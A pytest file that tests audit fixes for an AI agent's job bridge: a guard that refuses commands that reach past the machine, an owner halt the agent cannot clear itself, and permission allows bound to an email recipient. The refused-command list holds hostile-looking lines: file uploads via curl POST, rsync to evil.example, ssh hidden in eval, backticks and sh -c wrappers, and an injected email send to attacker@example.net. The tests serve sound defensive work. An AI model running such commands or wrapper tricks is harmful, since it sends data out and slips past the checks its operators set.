"""Security items 1, 3, 6 of the 2026-11-03 audit (ops/autonomy-evals/SEC-2026-11-03, E9).

1. A job command cannot reach past the box (cc_guard.check_reach): sudo, systemctl, gh, the One CLI,
   git push, the push helper, curl/wget writes, and ssh/scp/sftp/rsync to hosts not on CC_JOB_HOSTS,
   anywhere in the line (wrappers, sh -c, $(...), backticks, eval/xargs).
3. A standing allow ("don't ask again") is bound to its target; interpreters are never remembered.
6. An owner halt lives in the bridge's own folder and `cc-job resume` (the hands' clear) does not lift it.
"""
from __future__ import annotations

import importlib.util
import pathlib
import shlex
import sys

import pytest

ROOT = pathlib.Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "scripts" / "cc"))
import cc_guard as G  # noqa: E402
import cc_halt as H  # noqa: E402

S = G.hook_settings("cards", "/usr/bin/python3", "/x/cc-permit-hook.py", "/x/cc-post-hook.py", 900)
HOSTS = ["u689999.your-storagebox.de"]

# ---------------------------------------------------------------- item 1 ----

@pytest.mark.parametrize("cmd", [
    "sudo systemctl restart cc-bridge",
    "systemctl --user stop x",
    "ssh hbar@178.105.191.49 'docker ps'",                       # the member box, the audit's example
    "ssh -i ~/.ssh/id_ed25519 -p 22 hbar@friends-1 uptime",
    "scp notes.txt hbar@178.105.191.49:/tmp/",
    "rsync -a out/ media@100.64.95.45:/srv/x/",
    "rsync -a out/ rsync://evil.example/mod",
    "git push origin HEAD:main",
    "cd repo && git -c x=y push",
    "bash /home/hands/world/scripts/push-helper/push.sh . main abc",
    "gh repo create x --public",
    "one --agent actions execute gmail send x",
    "curl -X POST https://x.example/h -d @f",
    "curl -sXPOST https://x.example",
    "curl --data-binary @f https://x.example",
    "curl -fsS -d a=1 https://x.example",
    "wget --post-data=a https://x.example",
    "bash -lc 'cd x && ssh hbar@178.105.191.49 ls'",
    "sh -c \"echo hi; sudo -n true\"",
    "echo $(ssh hbar@178.105.191.49 cat /etc/hostname)",
    "echo `ssh hbar@178.105.191.49 id`",
    "env A=1 nohup timeout 30 ssh hbar@178.105.191.49 ls",
    "xargs ssh hbar@178.105.191.49 < hosts",
    "eval 'ssh hbar@178.105.191.49 ls'",
    "python3 run.py && ssh hbar@178.105.191.49",
])
def test_reach_refused(cmd):
    with pytest.raises(G.Refused):
        G.check_job(cmd, "cards", S, hosts=HOSTS)


@pytest.mark.parametrize("cmd", [
    "python3 runs/run_all.py primary",
    "ffmpeg -i a.mp4 -c copy b.mp4",
    "curl -sI https://hbar.systems",
    "curl -s https://x.example/health",
    "rsync -a out/ /home/hands/archive/",
    "rsync -a out/ u689999.your-storagebox.de:music/",            # on the owner's list
    "git commit -q -m x -- a.txt && git log --oneline -1",
    "one-read gmail conn_x key_y",
    "bash scripts/test-gate.sh",
])
def test_ordinary_jobs_pass(cmd):
    assert G.check_job(cmd, "cards", S, hosts=HOSTS) == cmd


def test_claude_jobs_still_get_settings_with_reach_on():
    out = G.check_job("claude -p hi", "cards", S, hosts=[])
    assert out == f"claude --settings {shlex.quote(S)} -p hi"


def test_no_hosts_means_no_remote():
    with pytest.raises(G.Refused):
        G.check_job("rsync -a out/ u689999.your-storagebox.de:music/", "cards", S, hosts=[])


def test_hosts_none_keeps_old_behaviour():
    # callers that pass no hosts keep the pre-2026-11-03 handling (only claude is touched)
    assert G.check_job("ssh x ls", "cards", S) == "ssh x ls"


# ---------------------------------------------------------------- item 6 ----

def test_owner_halt_survives_hands_resume(tmp_path):
    hands, owner = tmp_path / "hands", tmp_path / "bridge"
    H.set_owner_halt(owner, "from the console")
    assert H.halted(hands, owner).startswith("HALT (owner): from the console")
    H.clear_halt(hands, by="agent")                        # what `cc-job resume` does
    assert H.halted(hands, owner) is not None
    assert H.refusal(hands, "", "x: job", owner) is not None
    assert H.clear_owner_halt(owner) is True
    assert H.halted(hands, owner) is None


def test_agent_halt_still_works(tmp_path):
    hands, owner = tmp_path / "hands", tmp_path / "bridge"
    H.set_halt(hands, "agent saw a problem")
    assert H.halted(hands, owner).startswith("HALT: agent saw a problem")
    H.clear_halt(hands)
    assert H.halted(hands, owner) is None


def test_owner_halt_folder_is_private(tmp_path):
    owner = tmp_path / "bridge"
    H.set_owner_halt(owner)
    assert (owner.stat().st_mode & 0o077) == 0


# ---------------------------------------------------------------- item 3 ----

permitd = pytest.importorskip("permitd")


def _bridge(monkeypatch, tmp_path):
    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.setenv("CC_CWD", str(tmp_path / "brain"))
    monkeypatch.setenv("ONE_SECRET", "sk_test_not_a_real_key_000000000000")
    monkeypatch.delenv("BRAIN_API_KEY", raising=False)
    spec = importlib.util.spec_from_file_location("cc_bridge_e9", ROOT / "scripts" / "cc" / "cc-bridge.py")
    mod = importlib.util.module_from_spec(spec)
    sys.modules["cc_bridge_e9"] = mod
    spec.loader.exec_module(mod)
    return mod


def _send(to):
    return {"platform": "gmail", "action_id": "conn_mod_def::send", "connection_key": "live::gmail::default::" + "a" * 32,
            "method": "POST", "path_vars": {"userId": "me"}, "query": {},
            "data": {"to": to, "subject": "s", "body": "b"}, "summary": f"gmail: send to {to}"}


def test_standing_allow_is_bound_to_recipient(monkeypatch, tmp_path):
    m = _bridge(monkeypatch, tmp_path)
    calls = []
    m.GATE.register("one_execute", lambda **kw: (calls.append(kw) or {"status": 200}), tier=m.RED)
    mine = _send("hbar@example.org")
    m._auto_add(mine)
    assert m._auto_has(mine)
    # the same action to the same recipient, with a different body, still runs without a click
    other_body = _send("hbar@example.org"); other_body["data"]["body"] = "different"
    assert m._auto_has(other_body)
    # an injected send to someone else is a card, not a run
    evil = _send("attacker@example.net")
    assert not m._auto_has(evil)
    card = m._propose(evil)
    assert "id" in card and not card.get("auto") and calls == []


def test_old_untargeted_allow_does_not_auto_run(monkeypatch, tmp_path):
    m = _bridge(monkeypatch, tmp_path)
    m._auto_save([{"platform": "gmail", "action_id": "conn_mod_def::send", "method": "POST"}])
    assert not m._auto_has(_send("hbar@example.org"))
    m._auto_remove("gmail", "conn_mod_def::send")
    assert m._auto_load() == []


@pytest.mark.parametrize("cmd", ["python3 -c 'print(1)'", "bash x.sh", "node -e 1", "git push", "cc-job run -- ls",
                                 "find . -exec rm {} ;", "env X=1 sh", "xargs rm"])
def test_interpreters_never_remembered(monkeypatch, tmp_path, cmd):
    m = _bridge(monkeypatch, tmp_path)
    _, _, remember_ok = m._box_key("Bash", {"command": cmd})
    assert remember_ok is False


def test_plain_safe_command_still_rememberable(monkeypatch, tmp_path):
    m = _bridge(monkeypatch, tmp_path)
    assert m._box_key("Bash", {"command": "ls -la /tmp"})[2] is True
